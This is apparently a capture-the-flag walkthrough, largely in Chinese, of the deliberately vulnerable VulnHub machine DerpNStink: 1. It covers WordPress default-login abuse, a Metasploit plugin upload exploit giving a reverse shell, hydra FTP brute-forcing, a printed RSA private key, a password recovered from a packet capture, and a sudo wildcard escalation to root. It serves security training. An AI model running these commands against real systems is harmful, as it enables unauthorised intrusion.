# DerpNStink: 1

https://www.vulnhub.com/entry/derpnstink-1,221/

difficulty: Beginner

Finish Date：2024-4-12

## IP

192.168.10.158

## Scan

Open Port -> 21,22,80

```
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.2
22/tcp open  ssh     OpenSSH 6.6.1p1 Ubuntu 2ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   1024 124ef86e7b6cc6d87cd82977d10beb72 (DSA)
|   2048 72c51c5f817bdd1afb2e5967fea6912f (RSA)
|   256 06770f4b960a3a2c3bf08c2b57b597bc (ECDSA)
|_  256 28e8ed7c607f196ce3247931caab5d2d (ED25519)
80/tcp open  http    Apache httpd 2.4.7 ((Ubuntu))
|_http-server-header: Apache/2.4.7 (Ubuntu)
|_http-title: DeRPnStiNK
| http-robots.txt: 2 disallowed entries
|_/php/ /temporary/
```

21 ftp 不能匿名登陆，先看看 80 上 web 服务有什么，进行目录扫描，发现一些有用信息。

## flag1

http://192.168.10.158/ 查看源代码，发现了 flag1：

```
<--flag1(52E37291AEDF6A46D7D0BB8A6312F4F9F1AA4975C248C3F0E008CBA09D6E9166) -->
```

-   http://192.168.10.158/robots.txt

```
User-agent: *
Disallow: /php/
Disallow: /temporary/
```

/php/下面有一个 phpadmin，但是需要用户名和密码才能登陆；/temporary/下无有用信息。

-   http://192.168.10.158/webnotes/info.txt

根据提示需要将域名加到本地 hosts 文件

```
<-- @stinky, make sure to update your hosts file with local dns so the new derpnstink blog can be reached before it goes live -->
```

-   http://192.168.10.158/webnotes/ 上发现了需要在本地/etc/hosts 中配置的本地域名：derpnstink.local，将 192.168.10.158 derpnstink.local 添加到/etc/hosts 中。同时还发现了一个 ssh 系统用户：stinky。

访问扫描出来的 http://derpnstink.local/weblog/ ，看到提示是 WordPress，可能漏洞点在这个 WordPress 上。使用 wpscan 先扫描一波，发现版本为：4.6.9，找到一个用户名：admin。

然后发现了系统上安装了一个 wordpress 插件：slideshow-gallery 1.4.6。搜索后，发现这个插件存在文件上传漏洞，可以上传后门，执行 RCE，但是需要一个用户名和密码，尝试用我们发现的 admin 用户名登陆，密码的话先试试 admin，竟然能登陆后台管理界面，设置成用户名和密码一致，也是经常发生的情况。

在 msf 中有直接利用这个插件进行上传后门代码的 exp：exploit/unix/webapp/wp_slideshowgallery_upload，设置好相应的 RHOST、username、passwd 后进行 exploit。

```
Proxies                        no        A proxy chain of format type:host:port[,type:host:port][...]
RHOSTS       derpnstink.local  yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
RPORT        80                yes       The target port (TCP)
SSL          false             no        Negotiate SSL/TLS for outgoing connections
TARGETURI    /weblog           yes       The base path to the wordpress application
VHOST                          no        HTTP server virtual host
WP_PASSWORD  admin             yes       Valid password for the provided username
WP_USER      admin             yes       A valid username
```

执行后，获得了反弹的 meterpreter，shell 后，先升级 tty：python -c 'import pty; pty.spawn("/bin/bash")'

进入到 shell 后，先看看 mysql 是不是以 root 用户执行，发现是 www-data 用户执行。

获取到 wordpress 的数据库信息 /var/www/html/weblog/wp-config.php

```
define('DB_NAME', 'wordpress');
define('DB_USER', 'root');
define('DB_PASSWORD', 'mysql');
```

## flag2

进入到数据库后，查询 wp_posts ，找到了 flag2: flag2(a7d355b26bda6bf1196ccffead0b2cf2b81f0a9de5b4876b44407f1dc07e51e6)

发现 wp_user 对应的两个用户和密码：

```
admin:admin
unclestinky:wedgie57
```

发现了 2 个系统用户：mrderp、stinky，尝试用上面发现的 2 个密码去爆破下 ssh，看看能不能登陆，发现不能登陆，用密码访问被拒绝 Permission denied。前面我们还发现了有一个 ftp 的服务，尝试用这两个用户名去访问看看。

```
hydra -t 20 -L user -P pass ftp://192.168.10.158

[21][ftp] host: 192.168.10.158   login: stinky   password: wedgie57
```

进入后发现 files 目录，里面有几个文件夹。

/files/network-logs/derpissues.txt 中的内容:

```
12:06 mrderp: hey i cant login to wordpress anymore. Can you look into it?
12:07 stinky: yeah. did you need a password reset?
12:07 mrderp: I think i accidently deleted my account
12:07 mrderp: i just need to logon once to make a change
12:07 stinky: im gonna packet capture so we can figure out whats going on
12:07 mrderp: that seems a bit overkill, but wtv
12:08 stinky: commence the sniffer!!!!
12:08 mrderp: -_-
12:10 stinky: fine derp, i think i fixed it for you though. cany you try to login?
12:11 mrderp: awesome it works!
12:12 stinky: we really are the best sysadmins #team
12:13 mrderp: i guess we are...
12:15 mrderp: alright I made the changes, feel free to decomission my account
12:20 stinky: done! yay
```

然后在 ssh 文件夹中一直循环 cd ssh，最终得到了一个 key.txt，是用户的私钥

```
-----BEGIN RSA PRIVATE KEY-----
MIIEowIBAAKCAQEAwSaN1OE76mjt64fOpAbKnFyikjz4yV8qYUxki+MjiRPqtDo4
2xba3Oo78y82svuAHBm6YScUos8dHUCTMLA+ogsmoDaJFghZEtQXugP8flgSk9cO
uJzOt9ih/MPmkjzfvDL9oW2Nh1XIctVfTZ6o8ZeJI8Sxh8Eguh+dw69M+Ad0Dimn
AKDPdL7z7SeWg1BJ1q/oIAtJnv7yJz2iMbZ6xOj6/ZDE/2trrrdbSyMc5CyA09/f
5xZ9f1ofSYhiCQ+dp9CTgH/JpKmdsZ21Uus8cbeGk1WpT6B+D8zoNgRxmO3/VyVB
LHXaio3hmxshttdFp4bFc3foTTSyJobGoFX+ewIDAQABAoIBACESDdS2H8EZ6Cqc
nRfehdBR2A/72oj3/1SbdNeys0HkJBppoZR5jE2o2Uzg95ebkiq9iPjbbSAXICAD
D3CVrJOoHxvtWnloQoADynAyAIhNYhjoCIA5cPdvYwTZMeA2BgS+IkkCbeoPGPv4
ZpHuqXR8AqIaKl9ZBNZ5VVTM7fvFVl5afN5eWIZlOTDf++VSDedtR7nL2ggzacNk
Q8JCK9mF62wiIHK5Zjs1lns4Ii2kPw+qObdYoaiFnexucvkMSFD7VAdfFUECQIyq
YVbsp5tec2N4HdhK/B0V8D4+6u9OuoiDFqbdJJWLFQ55e6kspIWQxM/j6PRGQhL0
DeZCLQECgYEA9qUoeblEro6ICqvcrye0ram38XmxAhVIPM7g5QXh58YdB1D6sq6X
VGGEaLxypnUbbDnJQ92Do0AtvqCTBx4VnoMNisce++7IyfTSygbZR8LscZQ51ciu
Qkowz3yp8XMyMw+YkEV5nAw9a4puiecg79rH9WSr4A/XMwHcJ2swloECgYEAyHn7
VNG/Nrc4/yeTqfrxzDBdHm+y9nowlWL+PQim9z+j78tlWX/9P8h98gOlADEvOZvc
fh1eW0gE4DDyRBeYetBytFc0kzZbcQtd7042/oPmpbW55lzKBnnXkO3BI2bgU9Br
7QTsJlcUybZ0MVwgs+Go1Xj7PRisxMSRx8mHbvsCgYBxyLulfBz9Um/cTHDgtTab
L0LWucc5KMxMkTwbK92N6U2XBHrDV9wkZ2CIWPejZz8hbH83Ocfy1jbETJvHms9q
cxcaQMZAf2ZOFQ3xebtfacNemn0b7RrHJibicaaM5xHvkHBXjlWN8e+b3x8jq2b8
gDfjM3A/S8+Bjogb/01JAQKBgGfUvbY9eBKHrO6B+fnEre06c1ArO/5qZLVKczD7
RTazcF3m81P6dRjO52QsPQ4vay0kK3vqDA+s6lGPKDraGbAqO+5paCKCubN/1qP1
14fUmuXijCjikAPwoRQ//5MtWiwuu2cj8Ice/PZIGD/kXk+sJXyCz2TiXcD/qh1W
pF13AoGBAJG43weOx9gyy1Bo64cBtZ7iPJ9doiZ5Y6UWYNxy3/f2wZ37D99NSndz
UBtPqkw0sAptqkjKeNtLCYtHNFJAnE0/uAGoAyX+SHhas0l2IYlUlk8AttcHP1kA
a4Id4FlCiJAXl3/ayyrUghuWWA3jMW3JgZdMyhU3OV+wyZz25S8o
-----END RSA PRIVATE KEY-----
```

## flag3

chmod 600 key.txt
ssh -i key.txt -o PubkeyAcceptedKeyTypes=+ssh-rsa stinky@192.168.10.158

```
stinky@DeRPnStiNK:~$ find / -name flag*.txt 2>/dev/null
/home/stinky/Desktop/flag.txt

flag3(07f62b021771d3cf67e2e1faf18769cc5e5c119ad7d4d1847a11e11d6d5a7ecb)

```

## flag4

枚举出可能存在的内核漏洞：

```
[1] af_packet
    CVE-2016-8655
    Source: http://www.exploit-db.com/exploits/40871
[2] exploit_x
    CVE-2018-14665
    Source: http://www.exploit-db.com/exploits/45697
[3] get_rekt
    CVE-2017-16695
    Source: http://www.exploit-db.com/exploits/45010
```

这里没有尝试出可以提权的内核 exp。

寻找其他提权方式，在 /home/stinky/Documents/ 中找到了一个抓包文件：derpissues.pcap，传输到 kali 上，用 wireshark 打开，看是否有敏感信息。跟踪 Tcp 流，发现 wp-login 的 POST 请求：

```
POST /weblog/wp-login.php HTTP/1.1

log=mrderp&pwd=derpderpderpderpderpderpderp&wp-submit=Log+In&redirect_to=http%3A%2F%2Fderpnstink.local%2Fweblog%2Fwp-admin%2F&testcookie=1
```

用户名：mrderp，密码：derpderpderpderpderpderpderp，这个密码可能是对应系统用户的密码，尝试用 su mrderp 切换用户，成功。

```
sudo -l

(ALL) /home/mrderp/binaries/derpy*
```

但是这个目录不存在，我们可以创建一个，就可以读取/root 中的 flag：

```
mkdir binaries
cd binaries/
echo 'chmod +xs /bin/bash' > derpy
sudo /home/mrderp/binaries/derpy
/bin/bash -p
id
uid=1000(mrderp) gid=1000(mrderp) euid=0(root) egid=0(root) groups=0(root),1000(mrderp)

bash-4.3# cd Desktop
bash-4.3# ls
flag.txt
bash-4.3# cat flag.txt
flag4(49dca65f362fee401292ed7ada96f96295eab1e589c52e4e66bf4aedda715fdd)

Congrats on rooting my first VulnOS!

Hit me up on twitter and let me know your thoughts!

@securekomodo
```
